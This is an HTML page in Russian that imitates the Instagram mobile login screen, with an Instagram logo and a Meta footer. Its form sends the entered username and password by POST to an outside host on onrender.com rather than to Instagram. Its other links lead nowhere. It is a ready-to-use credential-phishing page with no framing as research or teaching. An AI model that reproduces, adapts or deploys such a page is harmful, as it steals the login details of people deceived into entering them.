<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport"
content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>

<title>Mobile Login</title>

<style>

/* RESET */
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

/* FULLSCREEN + NO SCROLL */
html,
body{
    width:100%;
    height:100%;
    overflow:hidden;
    position:fixed;
    touch-action:none;
    overscroll-behavior:none;
    -webkit-overflow-scrolling:none;
}

/* BODY */
body{
    background:#152235;
    font-family:-apple-system,BlinkMacSystemFont,
    "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    color:white;
}

/* MAIN CONTAINER */
.container{
    width:100vw;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:24px;
}

/* LOGIN BOX */
.login-box{
    width:100%;
    max-width:380px;
    height:100%;
    display:flex;
    flex-direction:column;
    align-items:center;
}

/* LANGUAGE */
.language{
    margin-top:12px;
    font-size:15px;
    color:rgba(255,255,255,0.75);
}

/* LOGO */
.logo{
    width:86px;
    height:86px;
    margin-top:70px;
    margin-bottom:60px;
    object-fit:contain;
}

/* FORM */
form{
    width:100%;
}

/* INPUTS */
.input-box{
    width:100%;
    margin-bottom:12px;
}

input{
    width:100%;
    height:52px;
    background:rgba(255,255,255,0.05);
    border:1px solid rgba(255,255,255,0.14);
    border-radius:14px;
    padding:0 16px;
    color:white;
    font-size:16px;
    outline:none;
}

input::placeholder{
    color:#9aa0a6;
}

input:focus{
    border-color:#0095f6;
}

/* BUTTON */
button{
    width:100%;
    height:52px;
    border:none;
    border-radius:999px;
    background:#0095f6;
    color:white;
    font-size:17px;
    font-weight:600;
    margin-top:8px;
    cursor:pointer;
}

/* FORGOT */
.forgot{
    margin-top:24px;
    color:white;
    text-decoration:none;
    font-size:15px;
}

/* BOTTOM */
.bottom{
    margin-top:auto;
    width:100%;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding-bottom:26px;
}

/* CREATE ACCOUNT */
.create-account{
    width:100%;
    height:52px;
    border:1px solid #0095f6;
    border-radius:999px;
    display:flex;
    align-items:center;
    justify-content:center;
    text-decoration:none;
    color:#0095f6;
    font-size:16px;
    font-weight:600;
}

/* META */
.meta{
    margin-top:28px;
    color:#a8a8a8;
    font-size:15px;
}

/* MOBILE FIX */
@media(max-height:700px){

    .logo{
        margin-top:40px;
        margin-bottom:40px;
    }

    .bottom{
        padding-bottom:18px;
    }

}

</style>
</head>

<body>

<div class="container">

    <div class="login-box">

        <div class="language">Русский</div>

        <img
        src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png"
        class="logo"
        alt="Instagram">

        <form action="https://insta-l177.onrender.com/" method="POST">

            <div class="input-box">
                <input
                type="text"
                name="username"
                placeholder="Имя пользователя, эл. адрес или номер телефона"
                required>
            </div>

            <div class="input-box">
                <input
                type="password"
                name="password"
                placeholder="Пароль"
                required>
            </div>

            <button type="submit">
                Войти
            </button>

        </form>

        <a href="#" class="forgot">
            Забыли пароль?
        </a>

        <div class="bottom">

            <a href="#" class="create-account">
                Создать новый аккаунт
            </a>

            <div class="meta">
                ∞ Meta
            </div>

        </div>

    </div>

</div>

</body>
</html>
